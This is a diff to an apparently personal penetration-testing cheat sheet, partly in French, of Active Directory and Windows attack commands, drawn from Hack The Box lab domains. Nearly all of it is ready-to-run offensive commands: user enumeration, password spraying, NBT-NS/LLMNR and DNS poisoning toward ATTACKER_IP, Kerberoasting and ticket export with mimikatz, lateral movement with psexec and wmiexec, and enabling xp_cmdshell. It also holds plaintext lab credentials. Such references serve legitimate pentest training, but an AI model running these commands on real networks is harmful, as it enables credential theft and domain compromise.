@@ -1,6 +1,318 @@
 # AD AND WINDOWS SCRIPT HINTS
 
-## <mark style="color:red;">Change Password (WINDOWS)</mark> <a href="#change-benjamins-password" id="change-benjamins-password"></a>
+## <mark style="color:red;">Kerbrute - Internal AD Username Enumeration</mark> <a href="#change-benjamins-password" id="change-benjamins-password"></a>
+
+{% code overflow="wrap" %}
+```
+kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">Enumerating the Password Policy</mark>
+
+{% code overflow="wrap" fullWidth="true" %}
+```shellscript
+crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+
+-----
+rpcclient -U "" -N 172.16.5.5
+getdompwinfo
+------
+
+enum4linux -P 172.16.5.5
+-----------
+
+net use \\DC01\ipc$ "" /u:"" ## Nul session
+net use \\DC01\ipc$ "password" /u:guest
+
+-----------
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+
+------------
+ import-module .\PowerView.ps1
+ Get-DomainPolicy
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">User Enumeration</mark> <a href="#change-benjamins-password" id="change-benjamins-password"></a>
+
+{% code overflow="wrap" %}
+```shellscript
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+----------------------------------------------------
+
+rpcclient -U "" -N 172.16.5.5
+
+rpcclient $> enumdomusers 
+------------------------------------------------------
+
+crackmapexec smb 172.16.5.5 --users
+
+-------------------------------------------------------
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">**Password Spraying**</mark>
+
+{% code overflow="wrap" fullWidth="true" %}
+```powershell
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+----------------------------------------
+
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+------------------------------------------
+
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+-----------------------------------------
+
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
+
+------------------------------------------
+
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">Security Enumeration</mark> <a href="#change-benjamins-password" id="change-benjamins-password"></a>
+
+{% code overflow="wrap" fullWidth="true" %}
+```powershell
+- Windows Defender :: Get-MpComputerStatus
+
+- AppLocker :: PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+- Mode Langage Contraint de PowerShell :: PS C:\htb> $ExecutionContext.SessionState.LanguageMode
+
+- LAPS :: Find-LAPSDelegatedGroups
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">GLOBAL ENUMERATION</mark> <a href="#change-benjamins-password" id="change-benjamins-password"></a>
+
+{% code overflow="wrap" fullWidth="true" %}
+```shellscript
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
+
+----------------------
+ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+ 
+ ----------------------
+ rpcclient -U "" -N 172.16.5.5
+ queryuser 0x457
+ enumdomusers
+ 
+ ---------------------
+ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
+ wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
+ -----------------------
+ 
+ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+ -----------------------
+ 
+ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
+ -----------------------
+ 
+ Get-Module
+ Import-Module ActiveDirectory
+ Get-ADDomain
+ Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+ Get-ADTrust -Filter *
+ Get-ADGroup -Filter * | select name
+ Get-ADGroup -Identity "Backup Operators"
+ Get-ADGroupMember -Identity "Backup Operators"
+ Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
+ Get-DomainGroupMember -Identity "Domain Admins" -Recurse
+ Get-DomainTrustMapping
+ Test-AdminAccess -ComputerName ACADEMY-EA-MS01
+ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+ 
+----------------------
+ 
+.\SharpView.exe Get-DomainUser -Help
+.\SharpView.exe Get-DomainUser -Identity forend
+
+------------------------
+ Snaffler.exe -s -d inlanefreight.local -o snaffler.log -v data
+ Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data 
+ 
+--------------------------
+PS C:\htb> Get-Module
+PS C:\htb> Get-ExecutionPolicy -List
+PS C:\htb> whoami
+PS C:\htb> Get-ChildItem Env: | ft key,value
+
+--------------------------
+PS C:\htb> Get-host
+PS C:\htb> powershell.exe -version 2
+PS C:\htb> Get-host
+----------------------------
+
+netsh advfirewall show allprofiles
+sc query windefend
+Get-MpComputerStatus
+qwinsta
+arp -a
+route print
+
+net group /domain
+net user /domain wrouse
+
+
+-----------------------------
+
+dsquery user
+dsquery computer
+dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
+dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+
+
+ 
+ 
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">WMIC</mark> <a href="#change-benjamins-password" id="change-benjamins-password"></a>
+
+{% code overflow="wrap" fullWidth="true" %}
+```powershell
+
+Host Enumeration:
+
+--- OS Specifics ---
+wmic os LIST Full (* To obtain the OS Name, use the "caption" property)
+
+wmic computersystem LIST full
+
+--- Anti-Virus ---
+
+wmic /namespace:\\root\securitycenter2 path antivirusproduct
+
+--- Peripherals ---
+wmic path Win32_PnPdevice 
+
+--- Installed Updates ---
+wmic qfe list brief
+
+--- Directory Listing and File Search ---
+
+wmic DATAFILE where "path='\\Users\\test\\Documents\\'" GET Name,readable,size
+
+wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE
+
+--- Local User Accounts ---
+
+wmic USERACCOUNT Get Domain,Name,Sid
+
+Domain Enumeration:
+
+--- Domain and DC Info ---
+
+wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE
+
+--- Domain User Info ---
+
+wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='testAccount'" GET 
+
+
+--- List All Users ---
+
+wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname
+
+--- List All Groups ---
+
+wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname
+
+--- Members of A Group ---
+
+wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value
+wmic path win32_groupuser where (groupcomponent="win32_group.name="domain admins",domain="YOURDOMAINHERE"")
+
+--- List All Computers ---
+
+wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname
+
+OR
+
+wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname
+
+Misc:
+
+--- Execute Remote Command ---
+
+wmic process call create "cmd.exe /c calc.exe"
+
+--- Enable Remote Desktop ---
+
+wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"
+
+OR
+
+wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">LLMNR/NBT-NS Poisoning</mark> <a href="#change-benjamins-password" id="change-benjamins-password"></a>
+
+{% code overflow="wrap" fullWidth="true" %}
+```powershell
+PS C:\htb> Import-Module .\Inveigh.ps1
+PS C:\htb> (Get-Command Invoke-Inveigh).Parameters
+PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+
+---------------------------------------------------------------------
+sudo responder -I ens224 
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">DNS Poisoning</mark> <a href="#change-benjamins-password" id="change-benjamins-password"></a>
+
+{% code overflow="wrap" %}
+```shellscript
+# Installation
+git clone https://github.com/dirkjanm/krbrelayx
+cd krbrelayx
+
+# Ajouter un enregistrement DNS malveillant
+python3 dnstool.py -u 'DOMAIN\user' -p 'password' \
+  --record 'SQL07' \
+  --action add \
+  --data 10.10.15.75 \
+  DC_IP
+  
+---------------------  
+# Alternative moderne
+bloodyAD -d DOMAIN -u USER -p 'PASS' --host DC_IP \
+  add dnsRecord HOSTNAME ATTACKER_IP
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">PASSWORD CHANGE</mark> <mark style="color:red;">(WINDOWS)</mark> <a href="#change-benjamins-password" id="change-benjamins-password"></a>
 
 {% code fullWidth="true" %}
 ```powershell
@@ -21,7 +333,7 @@ Set-ADAccountPassword -Identity $targetUser -NewPassword $benjaminNewPassword -C
 
 ***
 
-## <mark style="color:red;">Kerberoasting avec PowerView</mark>
+## <mark style="color:red;">Kerberoasting</mark>
 
 {% code fullWidth="true" %}
 ```sh
@@ -32,7 +344,11 @@ faketime "$(ntpdate -q DC.administrator.htb | cut -d ' ' -f 1,2)" impacket-GetUs
 ```
 {% endcode %}
 
-OU
+{% code overflow="wrap" fullWidth="true" %}
+```powershell
+setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+```
+{% endcode %}
 
 {% code fullWidth="true" %}
 ```powershell
@@ -44,6 +360,108 @@ $SecPassword = ConvertTo-SecureString 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -AsPlainTe
 $Cred = New-Object System.Management.Automation.PSCredential('ADMINISTRATOR.HTB\emily', $SecPassword)
 
 Get-DomainSPNTicket -Credential $Cred -SPN 'kerberoast/ethan'
+
+----------------------------------------------------------------------------------------------------------
+All tickets
+- PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+```
+{% endcode %}
+
+{% code overflow="wrap" fullWidth="true" %}
+```bash
+mimikatz # base64 /out:true
+isBase64InterceptInput  is false
+isBase64InterceptOutput is true
+
+mimikatz # kerberos::list /export  
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```shellscript
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
+
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">Kerberos Pre-Authentication</mark>
+
+{% code overflow="wrap" %}
+```
+Extraction du hash depuis PCAP
+1. Ouvrir le PCAP dans Wireshark
+2. Filtrer : kerberos.msg_type == 10 (AS-REQ)
+3. Trouver le paquet avec encrypted timestamp
+4. Extraire :
+   - Encryption type (etype) : KRB5-PADATA-ENC-TIMESTAMP > etype
+   - Username : CNameString
+   - Domain : realm
+   - Encrypted timestamp : cipher (hex)
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```
+# Avec krb5_roast_parser
+python3 krb5_roast_parser.py CAPTURE.pcap as_req
+
+# Avec Pcredz
+python3 Pcredz -f CAPTURE.pcap
+```
+{% endcode %}
+
+***
+
+## <mark style="color:red;">Privileged Access</mark>
+
+{% code overflow="wrap" %}
+```shellscript
+# Énumérer les membres du groupe "Remote Desktop Users"
+Get-NetLocalGroupMember -ComputerName COMPUTER-NAME -GroupName "Remote Desktop Users"
+
+# Énumérer les membres du groupe "Remote Management Users" (WinRM)
+Get-NetLocalGroupMember -ComputerName COMPUTER-NAME -GroupName "Remote Management Users"
+
+------------------------------------------------------------------
+RDP
+mstsc.exe /v:COMPUTER-NAME
+xfreerdp /u:USERNAME /d:DOMAIN /p:PASSWORD /v:TARGET-IP
+
+------------------------------------------------------------------
+WINRM
+
+$password = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force
+$cred = new-object System.Management.Automation.PSCredential ("DOMAIN\USERNAME", $password)
+Enter-PSSession -ComputerName TARGET-COMPUTER -Credential $cred
+
+evil-winrm -i TARGET-IP -u USERNAME -p PASSWORD
+------------------------------------------------------------------
+MSSQL
+
+- PowerUpSQL
+# Importation du module
+Import-Module PowerUpSQL.ps1
+
+# Énumération des instances SQL dans le domaine
+Get-SQLInstanceDomain
+
+# Exécution d'une requête SQL
+Get-SQLQuery -Verbose -Instance "TARGET-IP,1433" -username "DOMAIN\USERNAME" -password "PASSWORD" -query 'Select @@version'
+
+- Impacket
+# Connexion
+mssqlclient.py DOMAIN/USERNAME@TARGET-IP -windows-auth
+
+# Activation de xp_cmdshell
+SQL> enable_xp_cmdshell
+
+# Exécution de commandes système
+SQL> xp_cmdshell whoami /priv
 ```
 {% endcode %}
 
